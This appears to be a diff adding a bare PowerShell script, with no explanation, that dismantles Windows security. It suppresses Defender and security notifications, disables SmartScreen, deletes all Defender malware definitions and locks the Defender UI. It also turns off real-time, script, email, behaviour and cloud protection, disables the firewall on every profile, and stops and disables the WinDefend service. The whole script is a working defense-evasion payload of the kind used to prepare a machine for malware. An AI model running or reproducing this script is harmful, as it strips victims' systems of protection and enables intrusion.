@@ -1,0 +1,37 @@
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Type DWord -Value 1 2> $null;
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1;
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force;
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1;
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance";
+$propertyName = "Enabled";
+$desiredValue = 0;
+if (-not (Test-Path $regPath)) {
+    New-Item -Path $regPath -Force | Out-Null
+};
+Set-ItemProperty -Path $regPath -Name $propertyName -Value $desiredValue -Force;
+Set-NetFirewallProfile -Profile Domain,Private,Public -NotifyOnListen False;
+Set-MpPreference -UILockdown $true;
+cd "C:\Program Files\Windows Defender";
+.\MpCmdRun.exe -removedefinitions -all;
+Remove-MpPreference;
+Set-MpPreference -DisableRealtimeMonitoring $true;
+Set-MpPreference -SubmitSamplesConsent 2;
+Set-MpPreference -DisableArchiveScanning $true;
+Set-MpPreference -DisableEmailScanning $true;
+Set-MpPreference -DisableScriptScanning $true;
+Set-MpPreference -DisableIntrusionPreventionSystem $true;
+Set-MpPreference -DisableIOAVProtection $true;
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
+Set-MpPreference -DisableBehaviorMonitoring $true;
+Set-MpPreference -DisableBlockAtFirstSeen $true;
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
+Set-NetFirewallProfile -Profile Public -Enabled False;
+Set-NetFirewallProfile -Profile Private -Enabled False;
+Set-NetFirewallProfile -Profile Domain -Enabled False;
+Set-MpPreference -MAPSReporting 0;
+Set-MpPreference -PUAProtection 0;
+Set-MpPreference -DisableCloudProtection $true;
+Stop-Service -Name WinDefend -Force;
+Set-Service -Name WinDefend -StartupType Disabled;
+
+
